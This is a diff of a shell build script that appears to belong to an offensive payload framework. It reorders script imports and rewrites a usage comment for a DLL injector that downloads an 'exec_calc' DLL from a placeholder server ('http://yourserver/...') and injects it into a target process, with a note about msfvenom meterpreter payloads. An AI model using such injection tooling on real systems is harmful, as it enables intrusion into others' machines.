@@ -21,6 +21,9 @@ cat banner.txt
 # or enter $win64_compiler="mycompiler" here
 . build/global_win64.sh
 
+# import feature construction interface
+. build/feature_construction.sh
+
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
@@ -36,9 +39,6 @@ set_command_exec no_command
 enable_debug_print
 #CONFIGURATION_END
 
-
-# import feature construction interface
-. build/feature_construction.sh
 
 # compile exec_calc 64-bit dll payload from source
 # the idea was to generate a meterpreter dll payload here via msfvenom, but somehow the meterpreter dll appears to be non-injectible
@@ -74,11 +74,5 @@ echo "
 # Host the generated dll payload via HTTP on port 80
 # Call the injector executable like:
 # injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
-# 'random' just fills argv[2], which is not needed here"
-
-#USAGE_START
-# Host the generated dll payload via HTTP on port 80
-# Call the injector executable like:
-# injectdll_targetfromcmd_execcalc_downloadpsh_fopen_gethostbyname_win64.exe http://yourserver/exec_calc64.dll random target_pid,exec_calc64.dll
-# "random" just fills argv[2], which is not needed here
-#USAGE_END
+# 'random' just fills argv[2], which is not needed here
+"
